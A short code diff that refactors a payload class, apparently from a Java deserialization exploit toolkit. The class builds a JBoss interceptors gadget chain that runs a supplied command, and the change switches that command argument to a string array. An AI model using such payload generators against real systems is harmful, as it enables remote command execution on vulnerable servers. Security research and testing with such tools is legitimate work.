@@ -30,9 +30,9 @@ import java.util.*;
     "javax.enterprise:cdi-api:1.0-SP1", "javax.interceptor:javax.interceptor-api:3.1",
     "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21" })
 @Authors({ Authors.MATTHIASKAISER })
-public class JBossInterceptors1 implements ObjectPayload<Object> {
+public class JBossInterceptors1 extends ExtendedObjectPayload<Object> {
 
-    public Object getObject(final String command) throws Exception {
+    public Object getObject(final String[] command) throws Exception {
 
         final Object gadget = Gadgets.createTemplatesImpl(command);
 
